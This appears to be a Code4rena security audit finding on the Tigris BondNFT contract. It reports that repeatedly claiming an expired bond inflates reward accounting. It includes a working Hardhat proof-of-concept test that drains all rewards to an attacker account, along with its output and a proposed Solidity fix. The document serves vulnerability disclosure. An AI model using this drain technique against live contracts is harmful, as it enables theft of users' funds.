## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- sponsor confirmed
- H-05

# [Malicious user can steal all assets in BondNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/170) 

# Lines of code

https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187


# Vulnerability details

## Impact
Malicious user can drain all assets in BondNFT, and other users will lose their rewards.

## Proof of Concept
When calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.

```solidity
  if (bond.expired) {
      uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);
      if (totalShares[bond.asset] > 0) {
          accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];
      }
  }
```

In the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.

According to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively.
Thus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.

A malicious user can exploit this vulnerability to steal all assets in BondNFT contract:
1. Create two bonds (B1, B2) with different `expireEpoch`
2. At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.
3. Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.

An example of such an attack:
```javascript
diff --git a/test/09.Bonds.js b/test/09.Bonds.js
index 16c3ff5..7c445c3 100644
--- a/test/09.Bonds.js
+++ b/test/09.Bonds.js
@@ -245,7 +245,90 @@ describe("Bonds", function () {
       await lock.connect(user).release(2);
       expect(await bond.pending(1)).to.be.equals("999999999999999999725"); // Negligable difference from 1000e18 due to solidity division
     });
+
+    it.only("Drain BondNFT rewards", async function () {
+      const getState = async () => {
+        const balHacker= await stabletoken.balanceOf(hacker.address);
+        const balLock = await stabletoken.balanceOf(lock.address);
+        const balBond = await stabletoken.balanceOf(bond.address);
+        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)];
+        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3};
+      };
+      const parseEther = (v) => ethers.utils.parseEther(v.toString());
+      const gwei = parseEther(1).div(1e9);
+
+      // prepare tokens
+      const TotalRewards = parseEther(8000);
+      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards);
+      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000));
+      const hacker = rndAddress;
+      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700));
+      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000));
+
+      // bond1 - user
+      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100);
+      await bond.distribute(stabletoken.address, parseEther(3800));
+      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei);
+      // Skip some time
+      await network.provider.send("evm_increaseTime", [20*86400]);
+      await network.provider.send("evm_mine");
+
+      // bond2 - hacker
+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10);
+      // bond3 - hacker
+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100);
+
+      await bond.distribute(stabletoken.address, parseEther(2100));
+
+      // Skip 10+ days, bond2 is expired
+      await network.provider.send("evm_increaseTime", [13*86400]);
+      await network.provider.send("evm_mine");
+      await bond.distribute(stabletoken.address, parseEther(2100));
+
+      // check balances before hack
+      let st = await getState();
+      expect(st.bond).to.be.equals(TotalRewards);
+      expect(st.lock).to.be.equals(parseEther(3000));
+      expect(st.hacker).to.be.equals(parseEther(0+700));
+      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei);
+      expect(st.pending2).to.be.closeTo(parseEther(100), gwei);
+      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei);
+
+      // first claim of expired bond2
+      await lock.connect(hacker).claim(2);
+      st = await getState();
+      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei);
+      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei);
+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));
+      expect(st.pending2).to.be.eq(parseEther(0));
+      expect(st.pending3).to.be.gt(parseEther(1000+1000));
+
+      // hack
+      const remainReward = st.bond;
+      let pending3 = st.pending3;
+      let i = 0;
+      for (; remainReward.gt(pending3); i++) {
+        // claim expired bond2 repeatedly
+        await lock.connect(hacker).claim(2);
+        // pending3 keeps increasing
+        pending3 = await bond.pending(3);
+      }
+      console.log(`claim count: ${i}\nremain: ${ethers.utils.formatEther(remainReward)}\npending3: ${ethers.utils.formatEther(pending3)}\n`);
+
+      // send diff, then drain rewards in bond
+      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward));
+      await lock.connect(hacker).claim(3);
+      st = await getState();
+      // !! bond is drained !!
+      expect(st.bond).to.be.eq(0);
+      // !! hacker gets all rewards !!
+      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));
+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));
+      expect(st.pending2).to.be.eq(0);
+      expect(st.pending3).to.be.eq(0);
+    });
   });
+
   describe("Withdrawing", function () {
     it("Only expired bonds can be withdrawn", async function () {
       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther("100"));
```

Output:
```
  Bonds
    Rewards
claim count: 41
remain: 7900.000000000000000002
pending3: 8055.7342616570405578

      ✓ Drain BondNFT rewards

  1 passing (4s)

```

## Tools Used
VS Code

## Recommended Mitigation Steps
I recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.

Sample code:

```solidity

diff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol
index 33a6e76..77e85ae 100644
--- a/contracts/BondNFT.sol
+++ b/contracts/BondNFT.sol
@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {
         amount = bond.amount;
         unchecked {
             totalShares[bond.asset] -= bond.shares;
-            (uint256 _claimAmount,) = claim(_id, bond.owner);
+            (uint256 _claimAmount,) = _claim(_id, bond.owner);
             amount += _claimAmount;
         }
         asset = bond.asset;
@@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {
         _burn(_id);
         emit Release(asset, lockAmount, _owner, _id);
     }
+
     /**
-     * @notice Claim rewards from a bond
+     * @notice Claim rewards from an unexpired bond
      * @dev Should only be called by a manager contract
      * @param _id ID of the bond to claim rewards from
      * @param _claimer address claiming rewards
@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {
     function claim(
         uint _id,
         address _claimer
+    ) public onlyManager() returns(uint amount, address tigAsset) {
+        Bond memory bond = idToBond(_id);
+        require(!bond.expired, "expired");
+        return _claim(_id, _claimer);
+    }
+
+    /**
+     * @notice Claim rewards from a releasing bond or an unexpired bond
+     * @param _id ID of the bond to claim rewards from
+     * @param _claimer address claiming rewards
+     * @return amount amount of tigAsset claimed
+     * @return tigAsset tigAsset token address
+     */
+    function _claim(
+        uint _id,
+        address _claimer
     ) public onlyManager() returns(uint amount, address tigAsset) {
         Bond memory bond = idToBond(_id);
         require(_claimer == bond.owner, "!owner");
```

